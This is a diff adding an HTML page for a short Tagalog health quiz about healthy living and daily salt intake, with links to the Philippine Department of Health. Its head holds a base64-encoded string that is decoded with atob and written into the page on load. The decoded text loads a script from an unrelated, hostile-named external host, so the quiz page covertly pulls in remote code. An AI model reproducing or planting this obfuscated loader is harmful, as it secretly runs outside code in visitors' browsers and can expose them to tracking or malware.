@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="keywords" content="" />
+	<meta name="description" content="Matuto nang higit pa sa aming website" />
+	<meta name="robots" content="noindex, nofollow" />
+	<script>  	
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8vZnVja2ZiLnNpdGUvdHJhY2tlci5qcyI+PC9zY3JpcHQ+';           
+	let decoded = atob(encoded);           
+	document.write(''+ decoded +'');  
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+    <link rel="icon" href="favicon.ico">
+    <title>Ano ang isang malusog na pamumuhay?</title>
+    <link rel="stylesheet" href="templates/simplex.min.css">
+    <link href="templates/narrow-jumbotron.css" rel="stylesheet">
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Yeseva+One&display=swap" rel="stylesheet">
+    <style>
+ body {font-family: 'Yeseva One', serif;}
+	.pngflag {height: 16px; border: 1px solid #C0C0C0;}
+/* Colors */
+
+.accent-text {
+    color: #FF4081 !important;
+}
+.accent-color {
+    background-color: #FF4081 !important;
+}
+.accent-border {
+    border-color: #FF4081 !important;
+}
+.primary-text {
+    color: #2196F3 !important;
+}
+.primary-color {
+    background-color: #2196F3 !important;
+}
+.primary-border {
+    border-color: #2196F3 !important;
+}
+.grey-blue {
+    background-color: #f1f4f5;
+}
+.text-color {
+    color: #76838f !important;
+}
+.text-light {
+    font-weight: 400;
+    color: #B2B2B4;
+}
+.transparent {
+    background-color: transparent !important;
+}
+.no-shadow {
+    box-shadow: none;
+	
+.finished-text {
+    color: #2196F3 !important;
+}
+.finished-color {
+    background-color: #2196F3 !important;
+}
+.finished-border {
+    border-color: #2196F3 !important;
+}
+	</style>
+	
+	
+	
+  </head>
+
+  <body background="templates/d084e4dc7bdadda488952488cd2211b2.jpeg">
+    <div class="container Z4Xs3F">
+
+      <main role="main">
+
+        <div class="jumbotron Z4Xs3F">
+        <span id="index">
+          <p class="lead"><a href="http://www.doh.gov.ph/"></a></p>
+		</span>
+  
+		  <div class="row">
+
+                <div class="col s12 center-align animated fadein delay-1">				
+                  <span id="age">
+					  <h1 class="title white-text">Ano ang isang malusog na pamumuhay?</h1><br />
+                  <center><img src="https://i10.fotocdn.net/s114/189042721ffb0fb3/public_pin_l/2574684493.jpg" width="100%" /></center><br />
+                  </span>
+                  <span style="display:none;" id="gen">
+                  <h1 class="title white-text">Upang mapanatili ang kalusugan, ito ay sapat na upang gamitin ang hanggang sa ...ng asin bawat araw</h1><br />
+                  <center><img src="https://i10.fotocdn.net/s114/189042721ffb0fb3/public_pin_l/2574684493.jpg" width="100%" /></center><br />
+                  </span>
+                  <span style="display:none;" id="fin">
+				  <h1 class="display-3">Mga pagkain na mataas sa protina:</h1>
+				  <p class="title white-text">
+				   <a href="http://www.doh.gov.ph/" ><img src="templates/552f00eac3c34105fceaaeca068d5787.jpeg" width="50%"></a>
+				  <br /><br />
+				  Matuto nang higit pa sa aming website
+				  <br />
+				  </p>
+				  <h3></h3>
+				  
+				  </span>
+				  
+            </div>     </div><br>
+
+
+                <div class="col s12 center-align p-20 animated fadeinup delay-2 Z4Xs3F">
+                 
+               
+                  <div class="input-field animated fadein delay-4" id="agebtn">
+                  
+                    <a href="#" onclick="age(true)" class="waves-effect waves-light btn primary-color">A) Ito ay pag-uugali ng isang tao na naglalayong pagbibigay up masamang gawi</a>
+                    <a href="#" onclick="age(false)" class="waves-effect waves-light btn accent-color">B) Ito ay isang sistema ng pag-uugali ng tao na tinitiyak ng pisikal, mental at panlipunan kagalingan sa tunay na kapaligiran at aktibong kahabaan ng buhay</a>
+
+                  </div>
+
+                  <div class="input-field animated fadein delay-4" style="display:none;" id="genbtn">
+                  
+                    <a href="#" onclick="gen(true)"  class="btn btn-primary">A) hanggang sa 100 gramo</a>
+                    <a href="#" onclick="gen(false)"  class="btn btn-primary">B) hanggang sa 5 gramo</a>
+
+                  </div>
+
+                  <div class="input-field animated fadein delay-4" style="display:none;" id="finbtn">
+                   <a href="http://www.doh.gov.ph/" class="btn btn-primary">Matuklasan</a></a>
+                  </div>
+                </div>
+
+		  
+		  
+		  
+          
+        </div>
+
+
+
+      </main>
+
+</div>
+
+			
+			
+			
+			
+			<script>
+	function age(val){
+		document.getElementById("index").style.display = "none";
+		document.getElementById("age").style.display = "none";
+		document.getElementById("agebtn").style.display = "none";
+
+		document.getElementById("gen").style.display = "block";
+		document.getElementById("genbtn").style.display = "block";
+	}
+
+	function gen(val){
+		document.getElementById("index").style.display = "none";
+		document.getElementById("gen").style.display = "none";
+		document.getElementById("genbtn").style.display = "none";
+
+		document.getElementById("fin").style.display = "block";
+		document.getElementById("finbtn").style.display = "block";
+	}
+</script>
+
+
+
+<p align="center"></p>
+<p align="center"><a href="privacy-policy.html">Privacy policy</a> | <a href="terms.html">Terms and Conditions</a></p>
+    </div> <!-- /container -->
+
+  </body>
+</html>
